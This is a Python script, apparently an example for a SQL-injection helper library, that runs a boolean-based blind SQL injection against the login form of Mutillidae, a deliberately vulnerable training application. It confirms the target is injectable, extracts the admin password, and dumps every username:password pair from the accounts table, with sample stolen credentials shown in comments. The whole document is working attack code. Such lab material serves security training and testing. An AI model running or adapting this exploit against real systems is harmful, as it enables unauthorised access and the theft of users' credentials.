#!/bin/python

import logging
import string
import requests
from sqlinja import MySqlConfig, Mode, SqlInja
import sys

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def exec_request(payload: str, sleep_duration : int) -> bool:
    cookies = dict(showhints='0', PHPSESSID='<YOUR_SESSION_ID>')
    url = "http://<TARGET>/mutillidae/index.php?page=login.php"
    datas = {
        'username': f"test' OR {payload}#",
        'password': "pass",
        'login-php-submit-button': "Login",
    }
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    # Unlike timing-based extraction, the oracle here is a status code, not a
    # delay, so there is no timing jitter to worry about. The remaining risk
    # is a transport failure (timeout, connection reset): it must not be read
    # as "condition false", or it silently corrupts the extracted value.
    for attempt in range(3):
        try:
            res = requests.post(
                url, data=datas, headers=headers,
                allow_redirects=False, cookies=cookies,
                timeout=10,
            )
            return res.status_code == 302
        except requests.exceptions.RequestException as exc:
            logger.warning("request failed (attempt %d/3): %s", attempt + 1, exc)
            if attempt == 2:
                raise
    return False

helper = SqlInja(MySqlConfig(), exec_request, mode=Mode.BOOLEAN)

def check() -> None:
    if(helper.check("SELECT 1")):
        sys.stdout.write("Target is Vulnerable\n")
    else:
        sys.stdout.write("Target is not Vulnerable\n")
        sys.exit()

def extract_admin_pass() -> None:
    candidates = string.ascii_letters
    sys.stdout.write("pass for 'admin' : ")
    pwd = helper.extract_until_end_char("SELECT password FROM accounts WHERE username = 'admin' LIMIT 0,1", candidates)
    for char in pwd:
        sys.stdout.write(char)
        sys.stdout.flush()
    sys.stdout.write("\n")

def extract_all_creds() -> None:
    rq = "SELECT COUNT(*) FROM accounts"
    nbAccount = helper.extract_val(rq, 0, 500)
    sys.stdout.write("Numbers of accounts : %i \n" % nbAccount)

    candidates = string.ascii_letters + string.digits + ':'
    request_template = "SELECT CONCAT(username, ':', password) FROM accounts ORDER BY username {index}"
    users = helper.extract_column(request_template, candidates, 0, 3)
    for cell in users:
        sys.stdout.write("Username:Password : ")
        for char in cell:
            sys.stdout.write(char)
            sys.stdout.flush()
        sys.stdout.write("\n")

check()
# Target is Vulnerable
extract_admin_pass()
# pass for 'admin' : adminpass
extract_all_creds()
# Numbers of accounts : 16
# Username:Password : admin:adminpass
# Username:Password : adrian:somepassword
# Username:Password : bobby:password
# Username:Password : bryce:password
